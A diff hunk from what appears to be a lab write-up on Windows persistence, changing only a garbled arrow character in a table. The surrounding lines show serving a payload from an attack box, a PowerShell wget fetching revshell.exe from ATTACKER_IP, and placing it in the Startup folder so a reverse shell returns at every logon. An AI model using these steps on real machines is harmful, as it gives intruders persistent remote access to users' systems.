@@ -743,7 +743,7 @@ We will then copy our payload into the victim machine. You can spawn an`http.ser
 
 | | | |
 | ---------------------------------------------------------------------------------------------------------------------------------------------------- | --- | -------------------------------------------------------------------------------------------------------------- |
-| AttackBox<br><br>```shell-session<br>user@AttackBox$ python3 -m http.server <br>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... <br>``` | âžœ | Powershell<br><br>```shell-session<br>PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe<br>``` |
+| AttackBox<br><br>```shell-session<br>user@AttackBox$ python3 -m http.server <br>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... <br>``` | âž | Powershell<br><br>```shell-session<br>PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe<br>``` |
 
 We then store the payload into the`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` folder to get a shell back for any user logging into the machine.
 
